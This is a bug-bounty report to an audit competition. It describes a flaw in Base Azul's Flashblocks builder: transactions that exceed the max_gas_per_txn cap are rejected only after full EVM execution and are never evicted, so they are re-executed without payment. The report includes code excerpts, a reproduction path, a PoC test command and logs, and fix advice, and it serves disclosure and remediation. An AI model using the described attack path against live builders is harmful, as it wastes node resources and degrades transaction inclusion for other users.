# 76081 bc low builder max gas per txn over cap transactions are repeatedly re executed because post execution gas cap rejects are not permanently evicted

**Submitted on May 2nd 2026 at 15:40:34 UTC by @legat for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76081
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Summary

Base Azul's Flashblocks builder has a configured per-transaction gas guardrail, `builder.max_gas_per_txn`, that is intended to exclude transactions whose actual EVM gas usage exceeds a configured cap. The current implementation enforces that cap only after full EVM execution, and the resulting `MaxGasUsageExceeded` rejection is treated as a local iterator invalidation instead of a persistent txpool/rejection-cache eviction.

In `execute_best_transactions`, the builder calls the real EVM through `evm.transact(&tx)`, receives `ResultAndState`, reads `result.gas_used()`, and only then checks whether the transaction exceeded `builder_config.max_gas_per_txn`. When the cap is exceeded, the code records `TxnExecutionError::MaxGasUsageExceeded` and calls `best_txs.mark_invalid(tx.signer(), tx.nonce())`. It does not put the transaction hash into `diag.permanently_rejected_txs`.

`TxnExecutionError::is_permanent()` also does not classify `MaxGasUsageExceeded` as permanent. After each payload/flashblock build attempt, cleanup removes only hashes in `diag.permanently_rejected_txs` and separately prunes transactions that were actually committed. A max-gas-exceeded transaction is neither committed nor permanently rejected. As a result, it remains in the real txpool, remains outside the shared rejection cache, and can be selected and fully executed again by later builder attempts.

This turns the configured gas guardrail into a repeatable unpaid builder-work sink:

1. A public attacker submits valid high-priority transactions whose static validity checks pass and whose actual EVM gas usage exceeds `builder.max_gas_per_txn`.
2. The builder selects an attacker transaction from the real txpool.
3. The builder fully executes it in the real EVM.
4. Only after execution, the post-execution gas-used check rejects it.
5. Because the transaction is excluded before state commit, the attacker pays no gas for that builder execution work.
6. Because the rejection is not permanent, the transaction is not rejection-cached, not removed from the txpool, and not pruned as committed.
7. Later builder attempts can select and fully execute the same transaction again.

The attached single-file PoC proves the bug in the scoped `base/base @ v0.8.0-rc.28` repository using the real in-process builder, real txpool observer, real signed transactions submitted through the normal provider, and real Engine API block production. It does not mock or reimplement the vulnerable builder path.

The PoC proves:

* the over-cap transaction enters the real txpool;
* the builder excludes the same over-cap transaction in each produced block;
* normal control transactions from another sender are included, proving block production continues while the over-cap transaction remains available;
* after each rejection, the over-cap transaction remains physically present in the real txpool;
* after each rejection, the over-cap transaction remains `Pending`;
* after each rejection, the over-cap transaction is not in the shared rejection cache;
* repeated `payload_builder` debug logs show the same tx hash reaching `result="max gas usage exceeded"` fifteen times during one successful PoC run; and
* the test passes end-to-end against the repository's actual builder/txpool/Engine API harness.

## Finding Description

### Intended behavior

When `builder.max_gas_per_txn` is configured, a transaction that exceeds the configured per-transaction actual-gas cap should not repeatedly consume builder execution resources across later block/flashblock attempts under the same active configuration.

There are two safe implementation choices:

1. reject transactions before full EVM execution when their declared gas limit is incompatible with the active cap; or
2. if the cap is intentionally enforced from post-execution `gas_used`, persistently reject or evict the transaction for the active cap/config context after the builder has paid the EVM execution cost and discovered that the transaction cannot be included.

The repository already contains persistent-removal machinery for transaction classes that are intrinsically not includable. `TxnExecutionError::is_permanent()` identifies reject-cacheable errors, `diag.permanently_rejected_txs` carries those hashes out of execution, and payload cleanup calls `best_txs.mark_rejected()`, `metering_provider.remove()`, and `pool.remove_transactions()` for those hashes.

The intended invariant is:

```
transaction cannot be included under the active builder configuration
+ builder has already spent the work to determine that fact
=> do not repeatedly execute the same transaction across later builder attempts
```

For a configured `max_gas_per_txn` cap, a transaction whose actual gas usage exceeds the cap is not includable under the active configuration. It should therefore be pruned or rejection-cached for that configuration context after the first post-execution rejection.

### Actual behavior

The actual implementation discovers the over-cap condition only after full EVM execution and then performs only a local iterator invalidation.

`execute_best_transactions` calls `evm.transact(&tx)` before it checks `max_gas_per_txn`:

```rust
let tx_simulation_start_time = Instant::now();
let ResultAndState { result, state } = match evm.transact(&tx) {
    Ok(res) => res,
    Err(err) => {
        ...
    }
};
```

Only after the EVM returns does the builder read `result.gas_used()` and enforce the configured gas cap:

```rust
let gas_used = result.gas_used();
let is_success = result.is_success();
...
if let Some(max_gas_per_txn) = self.builder_config.max_gas_per_txn
    && gas_used > max_gas_per_txn
{
    let err = TxnExecutionError::MaxGasUsageExceeded;
    diag.record_rejection(&err);
    let priority_fee = tx.effective_tip_per_gas(base_fee).unwrap_or(0) as f64;
    record_rejected_tx_priority_fee(&err, priority_fee);
    log_txn(Err(err));
    best_txs.mark_invalid(tx.signer(), tx.nonce());
    continue;
}
```

This branch does not push the tx hash into `diag.permanently_rejected_txs`.

The permanent classifier also omits `MaxGasUsageExceeded`:

```rust
pub const fn is_permanent(&self) -> bool {
    matches!(
        self,
        Self::TransactionDASizeExceeded(_, _)
            | Self::ExecutionMeteringLimitExceeded(
                ExecutionMeteringLimitExceeded::TransactionExecutionTime(_, _),
            )
    )
}
```

Payload cleanup only removes permanently rejected transactions and committed transactions:

```rust
if !diag.permanently_rejected_txs.is_empty() {
    let rejected_count = diag.permanently_rejected_txs.len();
    best_txs.mark_rejected(&diag.permanently_rejected_txs);
    self.config.metering_provider.remove(&diag.permanently_rejected_txs);
    self.pool.remove_transactions(diag.permanently_rejected_txs.clone());
    ...
}
...
best_txs.mark_committed(&new_transactions);
self.config.metering_provider.remove(&new_transactions);
self.pool.prune_transactions(new_transactions);
```

The iterator wrapper confirms why this is persistent across later builder attempts. `refresh_iterator()` replaces the inner best-tx iterator from the pool, `mark_rejected()` inserts hashes into the shared rejection cache, and `mark_invalid()` only proxies to the current inner iterator:

```rust
pub fn refresh_iterator(&mut self, inner: reth_payload_util::BestPayloadTransactions<T, I>) {
    self.inner = inner;
}

pub fn mark_rejected(&mut self, tx_hashes: &[TxHash]) {
    for hash in tx_hashes {
        self.rejection_cache.insert(*hash);
    }
    BuilderMetrics::rejection_cache_insertions().increment(tx_hashes.len() as u64);
    BuilderMetrics::rejection_cache_size().set(self.rejection_cache.entry_count() as f64);
}
...
fn mark_invalid(&mut self, sender: Address, nonce: u64) {
    self.inner.mark_invalid(sender, nonce);
}
```

The resulting vulnerable sequence is:

```
full EVM execution happens
+ gas_used exceeds max_gas_per_txn
+ state is not committed
+ tx pays no gas
+ only current iterator is invalidated
+ tx is not permanently rejected
+ tx is not rejection-cached
+ tx is not removed from txpool
+ tx is not pruned as committed
=> later iterator refresh can select the same tx again
=> full EVM execution repeats
```

The PoC demonstrates this exact behavior. The same over-cap tx hash remains `Pending`, remains physically present in the pool, and remains absent from the rejection cache after three real block-building rounds:

```
POC_OVER_CAP_TX_HASH=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc
POC_INITIAL_STATUS=Some(Pending)
POC_ROUND=1 ... CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false ...
POC_ROUND=2 ... CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false ...
POC_ROUND=3 ... CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false ...
POC_RESULT=vulnerable_behavior_confirmed ...
```

The debug logs also show fifteen repeated post-EVM `max gas usage exceeded` events for the same tx hash in one successful run. Those lines are emitted from the builder's transaction-consideration logging after the execution result is known, so repeated appearances for the same hash prove repeated real EVM execution attempts rather than merely stale txpool presence.

## Root Cause

The root cause is that `MaxGasUsageExceeded` is treated as a transient current-iterator invalidation even though it means the transaction is not includable under the active builder configuration.

First, the cap is enforced after execution:

```rust
let ResultAndState { result, state } = match evm.transact(&tx) {
    Ok(res) => res,
    Err(err) => { ... }
};
...
let gas_used = result.gas_used();
...
if let Some(max_gas_per_txn) = self.builder_config.max_gas_per_txn
    && gas_used > max_gas_per_txn
{
    let err = TxnExecutionError::MaxGasUsageExceeded;
    diag.record_rejection(&err);
    ...
    best_txs.mark_invalid(tx.signer(), tx.nonce());
    continue;
}
```

Second, the over-cap transaction is excluded before commit. The attacker does not pay gas, and the builder discards the state changes, but the builder has already paid the EVM execution cost.

Third, the rejection is not recorded as permanent. The `MaxGasUsageExceeded` branch only calls `diag.record_rejection(&err)` and `best_txs.mark_invalid(...)`; it never pushes the tx hash into `diag.permanently_rejected_txs`.

Fourth, `TxnExecutionError::is_permanent()` omits `MaxGasUsageExceeded`, so common permanent-rejection plumbing cannot classify this error as reject-cacheable/removable.

Fifth, cleanup only removes permanently rejected tx hashes and committed tx hashes:

```rust
if !diag.permanently_rejected_txs.is_empty() {
    best_txs.mark_rejected(&diag.permanently_rejected_txs);
    self.config.metering_provider.remove(&diag.permanently_rejected_txs);
    self.pool.remove_transactions(diag.permanently_rejected_txs.clone());
    ...
}
...
best_txs.mark_committed(&new_transactions);
self.config.metering_provider.remove(&new_transactions);
self.pool.prune_transactions(new_transactions);
```

Sixth, the iterator wrapper distinguishes current-iterator invalidation from persistent rejection. `mark_invalid()` does not write the shared rejection cache; `mark_rejected()` does.

The combined root-cause sequence is therefore:

```
post-execution cap violation
=> local mark_invalid only
=> no permanent-rejection classification
=> no diag.permanently_rejected_txs entry
=> no mark_rejected
=> no metering_provider.remove
=> no pool.remove_transactions
=> transaction remains in pool
=> later refresh_iterator sees it again
=> full EVM execution repeats
```

## Impact Explanation

**Medium — repeated unpaid builder execution and transaction-inclusion degradation when the configured `builder.max_gas_per_txn` guardrail is enabled.**

A public attacker can submit valid high-priority transactions whose static validity checks pass and whose actual EVM gas usage exceeds the configured `builder.max_gas_per_txn` cap. Each time the builder attempts one of these transactions, it fully executes the transaction through the EVM, then rejects it only after measuring actual gas used.

Because the transaction is rejected before commit, the attacker pays no gas for this builder work. Because the transaction is not permanently rejected, not rejection-cached, not removed from the txpool, and not pruned as committed, the same transaction remains retryable across future flashblocks/blocks. Repeating this with many attacker-controlled accounts/transactions turns the configured cap from a one-time protection into a repeatable unpaid builder-work sink.

The attached PoC demonstrates the concrete impact with a real transaction and real block-building rounds:

```
POC_ROUND=1 ... CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false
POC_ROUND=2 ... CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false
POC_ROUND=3 ... CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false
```

The impact is sustained builder resource consumption and transaction-inclusion degradation under a real configured guardrail.

This issue is not merely a logging, telemetry, or local display mismatch. It affects the builder's transaction-selection and execution loop: attacker transactions repeatedly consume actual EVM execution work while remaining unpaid and retryable.

## Likelihood Explanation

Likelihood is realistic for deployments that enable `builder.max_gas_per_txn` as a per-transaction gas guardrail.

The external attacker requirements are simple:

* submit ordinary public signed transactions through normal transaction ingress;
* set high enough priority to keep them attractive to the best-transaction iterator;
* ensure the transactions' static validity checks pass; and
* make actual EVM gas usage exceed the configured `max_gas_per_txn` value.

The internal condition is a real builder configuration. The config field exists in `BuilderConfig`:

```rust
/// Maximum gas a transaction can use before being excluded.
pub max_gas_per_txn: Option<u64>,
```

The default is disabled:

```rust
max_gas_per_txn: None,
```

It is a real bug in the configured runtime path: when the guardrail is enabled, public over-cap transactions can repeatedly consume builder execution work without paying gas and without being evicted.

The in-repository configuration helper also demonstrates that this path is intended to be configurable and testable:

```rust
pub const fn with_max_gas_per_txn(mut self, max_gas: Option<u64>) -> Self {
    self.max_gas_per_txn = max_gas;
    self
}
```

The PoC uses this real configuration path and proves that the over-cap transaction survives across real builder attempts.

## Attack Path / Reproduction Path

1. A Base Azul builder deployment enables `builder.max_gas_per_txn` as a per-transaction gas guardrail.
2. The attacker submits a valid high-priority transaction whose static checks pass and whose actual EVM gas usage exceeds the configured cap.
3. The transaction enters the real txpool as `Pending` or `Queued`.
4. The builder refreshes its best-transaction iterator from the txpool.
5. The builder selects the attacker transaction.
6. The builder checks cancellation, then calls `evm.transact(&tx)`.
7. The EVM fully executes the transaction and returns `result` and `state`.
8. The builder reads `result.gas_used()`.
9. The builder detects `gas_used > max_gas_per_txn`.
10. The builder records `TxnExecutionError::MaxGasUsageExceeded`.
11. The builder calls only `best_txs.mark_invalid(tx.signer(), tx.nonce())`.
12. The builder does not commit the transaction state.
13. The attacker pays no gas for the builder's EVM work.
14. The builder does not add the tx hash to `diag.permanently_rejected_txs`.
15. `TxnExecutionError::is_permanent()` does not classify `MaxGasUsageExceeded` as permanent.
16. Payload cleanup does not call `mark_rejected`, `metering_provider.remove`, or `pool.remove_transactions` for the tx.
17. The transaction remains pending/queued in the pool and absent from the rejection cache.
18. A later block/flashblock attempt refreshes the best-tx iterator from the pool.
19. The same over-cap tx is selected again.
20. The builder fully executes the same tx again and rejects it again.
21. Repeating the pattern with many attacker-controlled accounts/txs burns builder execution resources and degrades normal transaction inclusion.

## External Preconditions

* `builder.max_gas_per_txn` is enabled in the builder configuration.
* The attacker can submit ordinary public signed transactions.
* The attacker can fund one or more accounts with enough balance for transaction validity.
* The attacker can craft transactions whose static validity checks pass while actual EVM gas usage exceeds the configured cap.
* No governance, admin, sequencer, prover, TEE/ZK, privileged key, L1 validator, or third-party bridge-validator compromise is required.

## Internal Preconditions

* The Flashblocks builder uses `BuilderConfig.max_gas_per_txn`.
* `execute_best_transactions` reaches `evm.transact(&tx)` for the attacker transaction.
* The post-execution `gas_used > max_gas_per_txn` branch fires.
* The branch calls only `best_txs.mark_invalid(tx.signer(), tx.nonce())`.
* `MaxGasUsageExceeded` is not classified as permanent by `TxnExecutionError::is_permanent()`.
* The tx hash is not pushed into `diag.permanently_rejected_txs`.
* Payload cleanup removes only `diag.permanently_rejected_txs` and committed txs.
* The tx remains in the txpool and outside the shared rejection cache.
* A later builder attempt refreshes the best-tx iterator from the pool.

## Recommendation

Make `MaxGasUsageExceeded` non-retryable for the active builder configuration, or avoid the expensive post-execution rejection path entirely.

### Primary fix

Classify `MaxGasUsageExceeded` as reject-cacheable/removable for the active parent/config context.

When `gas_used > max_gas_per_txn` fires:

1. add the tx hash to `diag.permanently_rejected_txs`, or an equivalent over-gas rejection bucket;
2. call `best_txs.mark_rejected()` for that hash after execution;
3. remove associated metering data;
4. remove the tx from the pool; and
5. ensure the tx cannot re-enter through iterator refresh or P2P re-gossip under the same active cap.

The fixed path should become:

```
MaxGasUsageExceeded
=> reject-cache tx hash for active config context
=> remove from txpool
=> do not repeatedly execute it across later builder attempts
```

If `max_gas_per_txn` can change at runtime, rejection-cache entries should be bound to a config/version epoch or parent/payload context so a later cap increase can safely re-evaluate previously rejected transactions.

### Additional hardening

1. Reject conservatively before full EVM execution when `tx.gas_limit > max_gas_per_txn`, if that matches intended semantics for this cap.
2. Keep the post-execution check for cases where actual gas must be measured, but make its rejection path persistent for the active configuration.
3. Add a regression test where an over-cap transaction is attempted once, then a later flashblock/block refresh occurs, and the transaction must not be selected/executed again under the same cap.
4. Add an assertion that `MaxGasUsageExceeded` either enters `diag.permanently_rejected_txs` or a dedicated config-scoped rejection cache.
5. Add metrics distinguishing first-time over-cap rejection from repeated attempts; any repeated attempt for the same tx hash under the same cap should fail the regression test.

## Affected Code (must be fixed in scope files)

### Mandatory fix 1: `max_gas_per_txn` is enforced after full EVM execution

* **File:** `crates/builder/core/src/flashblocks/context.rs`
* **Lines:** `L811-L821`, `L880-L904`
* **Links:**
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/context.rs#L811-L821>
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/context.rs#L880-L904>

The builder calls `evm.transact(&tx)` before the `max_gas_per_txn` check. After the post-execution gas check fires, the branch calls only `best_txs.mark_invalid(tx.signer(), tx.nonce())` and continues. This is the primary patch location for either pre-execution rejection or persistent over-cap rejection.

### Mandatory fix 2: `MaxGasUsageExceeded` is not classified as permanent

* **File:** `crates/builder/core/src/execution.rs`
* **Lines:** `L170-L172`, `L179-L194`
* **Links:**
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/execution.rs#L170-L172>
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/execution.rs#L179-L194>

`MaxGasUsageExceeded` exists as a transaction execution error, but `is_permanent()` does not include it. As a result, common permanent-rejection plumbing does not treat the over-cap transaction as reject-cacheable/removable.

### Mandatory fix 3: payload cleanup removes only `diag.permanently_rejected_txs` and committed transactions

* **File:** `crates/builder/core/src/flashblocks/payload.rs`
* **Lines:** `L596-L617`
* **Link:** <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/payload.rs#L596-L617>

Payload cleanup calls `mark_rejected`, `metering_provider.remove`, and `pool.remove_transactions` only for `diag.permanently_rejected_txs`, and then separately prunes committed transactions. Since the `MaxGasUsageExceeded` path does not populate `diag.permanently_rejected_txs` and the transaction is not committed, the over-cap tx avoids both cleanup paths.

### Mandatory fix 4: `mark_invalid()` is only current-iterator invalidation, while `mark_rejected()` writes the shared rejection cache

* **File:** `crates/builder/core/src/flashblocks/best_txs.rs`
* **Lines:** `L89-L103`, `L119-L139`
* **Links:**
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/best\\_txs.rs#L89-L103>
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/best\\_txs.rs#L119-L139>

The over-cap branch uses `mark_invalid`, which does not insert the tx hash into the shared rejection cache. Later `refresh_iterator()` calls can therefore see the same pool transaction again.

### Mandatory fix 5: `max_gas_per_txn` is a real builder configuration option and defaults to disabled

* **File:** `crates/builder/core/src/config.rs`
* **Lines:** `L45-L46`, `L135-L135`, `L170-L174`
* **Links:**
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/config.rs#L45-L46>
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/config.rs#L135-L135>
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/config.rs#L170-L174>

This confirms the report's scope and configuration caveat: the issue is real when the cap is enabled, but the default config has `max_gas_per_txn: None`. The fix should preserve safe behavior across config changes.

## Proof of Concept

This POC contains the complete scenario needed to prove the Medium bug.

It proves:

* the over-cap transaction enters the real txpool;
* the transaction is excluded by the configured post-execution `max_gas_per_txn` guardrail;
* the transaction is not included in any built block;
* the transaction remains physically present in the real txpool after every rejection;
* the transaction remains `Pending` after every rejection;
* the transaction is not inserted into the shared rejection cache;
* normal control transactions are included in each round; and
* repeated debug logs show the same tx hash reaching `result="max gas usage exceeded"` fifteen times.

The PoC uses the real in-process builder, real txpool observer, real signed transactions submitted through the normal RPC provider, and real Engine API FCU/getPayload/newPayload/forkchoice block production.

### Scenario: one over-cap tx survives and is retried across three real builder rounds

1. Configure the builder with `BuilderConfig::for_tests().with_max_gas_per_txn(Some(25_000))`.
2. Start the real in-process builder/test instance.
3. Fund a separate account for control transactions.
4. Submit one high-priority over-cap transaction using the repository's transaction builder helper.
5. Wait until the tx appears in the real txpool as `Pending` or `Queued`.
6. Assert it is not initially in the rejection cache.
7. For each of three rounds, submit a normal control transaction from a separate account.
8. Build a real block through the Engine API test harness.
9. Assert the control transaction is included.
10. Assert the over-cap transaction is not included.
11. Assert the over-cap transaction still exists in the real txpool.
12. Assert the over-cap transaction remains `Pending` or `Queued`.
13. Assert the over-cap transaction is not in the shared rejection cache.
14. Assert the final result is `POC_RESULT=vulnerable_behavior_confirmed`.

**Test file name:**

```
poc_post_execution_gas_cap_retry.rs
```

**Where to place:**

```bash
base-azul-offchain/crates/builder/core/tests/poc_post_execution_gas_cap_retry.rs
```

**Command to run from the `base-azul-offchain` repository root:**

```bash
TEST_TRACE=debug cargo test -p base-builder-core --features test-utils --test poc_post_execution_gas_cap_retry poc_over_cap_tx_survives_and_is_retried_across_blocks -- --nocapture 2>&1 | tee poc_post_execution_gas_cap_retry.standard.log
```

**Logs:**

```
POC_OVER_CAP_TX_HASH=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc
POC_INITIAL_STATUS=Some(Pending)
POC_ROUND=1 BLOCK_HASH=0xaafad0ba787043cad32a84b1c24f583640bb3b7550fbcdb0524e768f4d231762 CONTROL_TX=0x0bc42658e54700bc95481d0579871bc2a00c0405bfb4f19784581e93620f47fa CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false OVER_CAP_HISTORY=Some([Pending])
POC_ROUND=2 BLOCK_HASH=0xd25c40df4e6072302cd6487446a7a1f5a4fcb1d9f7ced560784a891c7f224c9d CONTROL_TX=0xddb32a98262fca6420459d6387ae6faea0d731cfb22db2abf48dd0dce0c6a94a CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false OVER_CAP_HISTORY=Some([Pending])
POC_ROUND=3 BLOCK_HASH=0xbf4c2298e45003eb561ca248cca31c5894360d27874df431060085d12393cc5b CONTROL_TX=0x478c0de7b9be13a85b432789e37ca8e0e37c16700a486803fc213514cd275e74 CONTROL_INCLUDED=true OVER_CAP_INCLUDED=false OVER_CAP_STATUS=Some(Pending) OVER_CAP_POOL_EXISTS=true REJECTION_CACHED=false OVER_CAP_HISTORY=Some([Pending])
POC_RESULT=vulnerable_behavior_confirmed built_blocks=[0xaafad0ba787043cad32a84b1c24f583640bb3b7550fbcdb0524e768f4d231762, 0xd25c40df4e6072302cd6487446a7a1f5a4fcb1d9f7ced560784a891c7f224c9d, 0xbf4c2298e45003eb561ca248cca31c5894360d27874df431060085d12393cc5b]
test poc_over_cap_tx_survives_and_is_retried_across_blocks ... ok
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 1 filtered out; finished in 24.96s
```

**Repeated execution proof for the same over-cap hash:**

```
2026-05-01T19:13:39.777621Z  INFO poc_post_execution_gas_cap_retry: over-cap tx entered txpool over_cap_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc initial_status=Some(Pending)
2026-05-01T19:13:40.094510Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:40.094987Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:40.137582Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:40.137789Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:40.335675Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:40.335895Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:40.534621Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:40.534838Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:40.740650Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:40.740882Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:41.416087Z  INFO poc_post_execution_gas_cap_retry: built block while over-cap tx was available round=1 block_hash=0xaafad0ba787043cad32a84b1c24f583640bb3b7550fbcdb0524e768f4d231762 over_cap_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc control_hash=0x0bc42658e54700bc95481d0579871bc2a00c0405bfb4f19784581e93620f47fa over_cap_status=Some(Pending) over_cap_history=Some([Pending]) rejection_cached=false
2026-05-01T19:13:42.037480Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:42.037680Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:42.115759Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:42.116021Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:42.316195Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:42.316448Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:42.515674Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:42.515877Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:42.716639Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:42.716886Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:43.293641Z  INFO poc_post_execution_gas_cap_retry: built block while over-cap tx was available round=2 block_hash=0xd25c40df4e6072302cd6487446a7a1f5a4fcb1d9f7ced560784a891c7f224c9d over_cap_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc control_hash=0xddb32a98262fca6420459d6387ae6faea0d731cfb22db2abf48dd0dce0c6a94a over_cap_status=Some(Pending) over_cap_history=Some([Pending]) rejection_cached=false
2026-05-01T19:13:44.020098Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:44.020291Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:44.106744Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:44.106896Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:44.308018Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:44.308238Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:44.506657Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
2026-05-01T19:13:44.506848Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:44.707033Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=Success
